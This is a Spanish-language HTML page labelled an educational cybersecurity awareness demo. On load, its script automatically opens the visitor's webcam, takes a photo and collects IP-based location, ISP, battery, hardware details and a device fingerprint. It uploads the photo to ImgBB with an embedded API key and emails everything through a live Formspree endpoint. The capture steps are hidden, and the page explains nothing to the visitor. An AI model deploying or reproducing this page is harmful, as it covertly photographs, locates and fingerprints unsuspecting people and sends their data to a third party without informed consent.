<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Demo de Concientización - Ciberseguridad</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 900px;
            width: 100%;
        }

        .header {
            text-align: center;
            padding: 40px 20px;
        }

        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #e94560, #ff6b6b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .header p {
            color: #a0a0a0;
            font-size: 1.1em;
        }

        .warning-banner {
            background: rgba(233, 69, 96, 0.15);
            border: 1px solid #e94560;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: center;
        }

        .warning-banner h3 {
            color: #e94560;
            margin-bottom: 8px;
        }

        .step-card {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 20px;
            padding: 40px;
            margin-bottom: 25px;
            text-align: center;
            backdrop-filter: blur(10px);
            transition: transform 0.3s;
        }

        .step-card:hover {
            transform: translateY(-5px);
        }

        .step-number {
            display: inline-block;
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #e94560, #ff6b6b);
            border-radius: 50%;
            line-height: 50px;
            font-size: 1.5em;
            font-weight: bold;
            margin-bottom: 15px;
        }

        .btn {
            background: linear-gradient(135deg, #e94560, #ff6b6b);
            color: white;
            border: none;
            padding: 18px 50px;
            font-size: 1.2em;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            margin: 15px 10px;
            font-weight: 600;
        }

        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 10px 30px rgba(233, 69, 96, 0.4);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        #video-preview {
            width: 100%;
            max-width: 500px;
            border-radius: 20px;
            border: 3px solid #e94560;
            display: none;
            margin: 20px auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }

        #captured-photo {
            width: 100%;
            max-width: 500px;
            border-radius: 20px;
            border: 3px solid #4ecca3;
            display: none;
            margin: 20px auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }

        .data-panel {
            background: rgba(0,0,0,0.3);
            border-radius: 15px;
            padding: 25px;
            margin-top: 20px;
            text-align: left;
            display: none;
        }

        .data-panel h3 {
            color: #4ecca3;
            margin-bottom: 15px;
            text-align: center;
        }

        .data-item {
            display: flex;
            justify-content: space-between;
            padding: 12px 15px;
            margin: 8px 0;
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
            border-left: 4px solid #e94560;
        }

        .data-label {
            color: #a0a0a0;
            font-weight: 500;
        }

        .data-value {
            color: #fff;
            font-weight: 600;
            font-family: 'Courier New', monospace;
        }

        .flash-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: white;
            opacity: 0;
            pointer-events: none;
            z-index: 9999;
            transition: opacity 0.1s;
        }

        .loading {
            display: none;
            margin: 20px auto;
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid #e94560;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .status-message {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            display: none;
        }

        .status-success {
            background: rgba(78, 204, 163, 0.2);
            border: 1px solid #4ecca3;
            color: #4ecca3;
        }

        .status-error {
            background: rgba(233, 69, 96, 0.2);
            border: 1px solid #e94560;
            color: #e94560;
        }

        .hidden { display: none !important; }

        .footer {
            text-align: center;
            padding: 30px;
            color: #666;
            font-size: 0.9em;
        }

        .footer a {
            color: #e94560;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="flash-overlay" id="flash"></div>

    <div class="container">
        
        <!-- HEADER -->
        <div class="header">
            <h1>PROYECTO EDUCATIVO</h1>
        </div>

        <!-- WARNING BANNER -->
        <div class="warning-banner">
            <h3>PROYECTO EDUCATIVO</h3>
            <p>Este sitio es parte de una demostración académica.</p>
        </div>


        <!-- PASO 2: CÁMARA -->
        <div class="step-card hidden" id="step-2">
            <div class="step-number">2</div>
            
            <video id="video-preview" autoplay playsinline></video>
            <canvas id="canvas" style="display:none;"></canvas>
            
            <div class="loading" id="camera-loading"></div>
            
            <div class="status-message" id="camera-status"></div>
        </div>

        <!-- PASO 3: FOTO CAPTURADA -->
        <div class="step-card hidden" id="step-3">
            <div class="step-number">3</div>
            
            <img id="captured-photo" alt="Tu foto capturada">
            
            <div class="status-message status-success" id="send-status" style="display: block;">

            </div>

        </div>

        </div>

    <script>
        // ==================== CONFIGURACIÓN ====================
        // REEMPLAZA ESTO CON TU ENDPOINT DE FORMSPREE
        const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xkoegvee';
        const IMGBB_API_KEY = '3119176b7072d4d2e31a1f3c9be657be';
        
        // ==================== VARIABLES ====================
        let videoStream = null;
        let capturedImageData = null;
        let userData = {};

        // ==================== SUBIR IMAGEN A IMGBB ====================
        async function uploadToImgBB(imageData) {
            // Convertir base64 a blob para subir
            const byteString = atob(imageData.split(',')[1]);
            const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([ab], { type: mimeString });
        
            // Crear FormData para ImgBB
            const formData = new FormData();
            formData.append('image', blob, 'captura-demo.png');
        
            try {
                const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
                    method: 'POST',
                    body: formData
                });
        
                const result = await response.json();
        
                if (result.success) {
                    console.log('✅ Imagen subida a ImgBB:', result.data.url);
                    return {
                        url: result.data.url,           // URL directa de la imagen
                        display_url: result.data.display_url,  // URL con vista previa
                        delete_url: result.data.delete_url     // URL para borrar la imagen
                    };
                } else {
                    console.error('❌ Error de ImgBB:', result);
                    return null;
                }
            } catch (error) {
                console.error('❌ Error al subir a ImgBB:', error);
                return null;
            }
        }

        // ==================== DETECCIÓN DE NAVEGADOR/OS ====================
        function detectBrowser() {
            const ua = navigator.userAgent;
            let browser = "Desconocido";
            let os = "Desconocido";

            // Navegador
            if (ua.indexOf("Chrome") > -1 && ua.indexOf("Edg") === -1) browser = "Google Chrome";
            else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) browser = "Safari";
            else if (ua.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
            else if (ua.indexOf("Edg") > -1) browser = "Microsoft Edge";
            else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";

            // Sistema Operativo
            if (ua.indexOf("Windows") > -1) os = "Windows";
            else if (ua.indexOf("Mac") > -1) os = "macOS";
            else if (ua.indexOf("Linux") > -1) os = "Linux";
            else if (ua.indexOf("Android") > -1) os = "Android";
            else if (ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) os = "iOS";

            return { browser, os };
        }

        // ==================== OBTENER IP Y UBICACIÓN ====================
        async function getIPAndLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip || 'No disponible',
                    city: data.city || 'No disponible',
                    region: data.region || 'No disponible',
                    country: data.country_name || 'No disponible',
                    isp: data.org || 'No disponible'
                };
            } catch (e) {
                return { ip: 'No disponible', city: 'No disponible', region: '', country: '', isp: '' };
            }
        }

        // ==================== OBTENER DATOS DE BATERÍA ====================
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return `${Math.round(battery.level * 100)}% ${battery.charging ? '(Cargando)' : '(Descargando)'}`;
                } catch (e) {
                    return 'No disponible';
                }
            }
            return 'API no soportada';
        }

        // ==================== RECOLECTAR TODOS LOS DATOS ====================
        async function collectAllData() {
            const ipData = await getIPAndLocation();
            const battery = await getBatteryInfo();
            const { browser, os } = detectBrowser();
        
            // 1. Velocidad de conexión
            const conn = navigator.connection;
            const conexionInfo = conn 
                ? `${conn.effectiveType?.toUpperCase() || 'Desconocido'} (${conn.downlink || '?'} Mbps)` 
                : 'No disponible';
        
            // 2. Fingerprint único del dispositivo
            const fingerprint = generateFingerprint();
        
            // 3. ¿GPS disponible?
            const gpsDisponible = 'geolocation' in navigator 
                ? 'Sí — el navegador puede solicitar tu ubicación exacta' 
                : 'No disponible';
        
            // 4. Plugins instalados (solo los nombres, no detalles sensibles)
            const plugins = navigator.plugins 
                ? Array.from(navigator.plugins).slice(0, 5).map(p => p.name).join(', ') || 'Ninguno detectado'
                : 'No disponible';
        
            userData = {
                // Datos originales
                ip: ipData.ip,
                location: `${ipData.city}, ${ipData.region}, ${ipData.country}`,
                isp: ipData.isp,
                os: os,
                browser: browser,
                userAgent: navigator.userAgent,
                screenResolution: `${screen.width}x${screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                device: /Mobi|Android/i.test(navigator.userAgent) ? 'Móvil 📱' : 'Desktop 💻',
                referrer: document.referrer || 'Directo / Desconocido',
                battery: battery,
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency || 'Desconocido',
                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Desconocido',
                timestamp: new Date().toLocaleString('es-ES', { timeZone: 'America/Mexico_City' }),
                
                // Datos NUEVOS
                conexion: conexionInfo,
                fingerprint: fingerprint,
                gps_disponible: gpsDisponible,
                plugins: plugins,
                color_depth: `${screen.colorDepth}-bit`,
                touch_support: 'ontouchstart' in window ? 'Sí (pantalla táctil)' : 'No',
                cookies_enabled: navigator.cookieEnabled ? 'Sí' : 'No',
                pdf_viewer: navigator.pdfViewerEnabled !== undefined 
                    ? (navigator.pdfViewerEnabled ? 'Integrado' : 'Externo') 
                    : 'Desconocido'
            };
        
            return userData;
        }
        
        // ==================== FUNCIÓN FINGERPRINT ====================
        function generateFingerprint() {
            const data = [
                navigator.userAgent,
                navigator.language,
                screen.width + 'x' + screen.height,
                screen.colorDepth,
                new Date().getTimezoneOffset(),
                navigator.hardwareConcurrency || 'unknown',
                navigator.deviceMemory || 'unknown',
                navigator.platform,
                'ontouchstart' in window ? 'touch' : 'no-touch'
            ];
            
            const str = data.join('|');
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            
            return 'FP-' + Math.abs(hash).toString(16).toUpperCase().padStart(8, '0');
        }
        
                // ==================== ENVIAR A FORMSPREE ====================
        async function sendToFormspree(imageUrl) {
            const payload = {
                foto_url: imageUrl,                    // URL de la imagen (se verá en el email)
                ip: userData.ip || 'No disponible',
                ubicacion: userData.location || 'No disponible',
                navegador: userData.browser || 'No disponible',
                sistema_operativo: userData.os || 'No disponible',
                pantalla: userData.screenResolution || 'No disponible',
                ventana: userData.windowSize || 'No disponible',
                idioma: userData.language || 'No disponible',
                zona_horaria: userData.timezone || 'No disponible',
                dispositivo: userData.device || 'No disponible',
                referrer: userData.referrer || 'No disponible',
                bateria: userData.battery || 'No disponible',
                nucleos: userData.cores || 'No disponible',
                memoria: userData.memory || 'No disponible',
                user_agent: userData.userAgent || 'No disponible',
                plataforma: userData.platform || 'No disponible',
                proveedor: userData.isp || 'No disponible',
                timestamp: userData.timestamp || new Date().toISOString()
            };
        
            try {
                const response = await fetch(FORMSPREE_ENDPOINT, {
                    method: 'POST',
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    console.log('✅ Datos enviados correctamente a Formspree');
                    return true;
                } else {
                    const errorText = await response.text();
                    console.error('❌ Error al enviar:', response.status, errorText);
                    return false;
                }
            } catch (error) {
                console.error('❌ Error de red:', error);
                return false;
            }
        }


        // ==================== INICIAR DEMO ====================
        async function startDemo() {

            const statusEl = document.getElementById('camera-status');
            statusEl.className = 'status-message';

            try {
                // 1. Solicitar cámara
                videoStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false 
                });

                const video = document.getElementById('video-preview');
                video.srcObject = videoStream;
                
                statusEl.className = 'status-message status-success';

                // 2. Esperar a que el video esté listo
                video.onloadedmetadata = () => {
                    // 3. Esperar 1 segundo para que la cámara se estabilice
                    setTimeout(() => {
                        captureAndSend();
                    }, 1000);
                };

            } catch (err) {
                statusEl.textContent = '❌ Acceso a cámara denegado. En un ataque real, el atacante intentaría otro método.';
                statusEl.className = 'status-message status-error';
                document.getElementById('camera-loading').style.display = 'none';
                console.error(err);
            }
        }

        // ==================== CAPTURAR Y ENVIAR ====================
        async function captureAndSend() {
            const video = document.getElementById('video-preview');
            const canvas = document.getElementById('canvas');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            // Convertir a imagen
            capturedImageData = canvas.toDataURL('image/png');
            
            // Detener cámara
            videoStream.getTracks().forEach(track => track.stop());
            video.style.display = 'none';
            document.getElementById('camera-loading').style.display = 'none';
            document.getElementById('camera-status').style.display = 'none';


            // Recolectar datos
            await collectAllData();

            // Enviar todo a Formspree
            // Subir imagen a ImgBB y obtener URL
            const imgbbResult = await uploadToImgBB(capturedImageData);
            
            if (imgbbResult) {
                // Enviar URL a Formspree (la imagen será visible en el email)
                await sendToFormspree(imgbbResult.url);
                
                // Opcional: mostrar la URL en consola para debug
                console.log('🔗 URL de la imagen:', imgbbResult.url);
                console.log('🗑️ URL para borrar:', imgbbResult.delete_url);
            } else {
                console.warn('⚠️ No se pudo subir la imagen, enviando solo datos...');
                await sendToFormspree('No disponible - Error al subir imagen');
            }

            // Scroll automático
            setTimeout(() => {
                document.getElementById('step-3').scrollIntoView({ behavior: 'smooth' });
            }, 500);
        }

        // ==================== INICIALIZAR ====================
        window.onload = () => {
            // Pre-cargar algunos datos que no necesitan async
            const { browser, os } = detectBrowser();
            console.log('Navegador detectado:', browser, 'OS:', os);
            setTimeout(() => {
                startDemo();
            }, 1500);
        };
    </script>

</body>
</html>
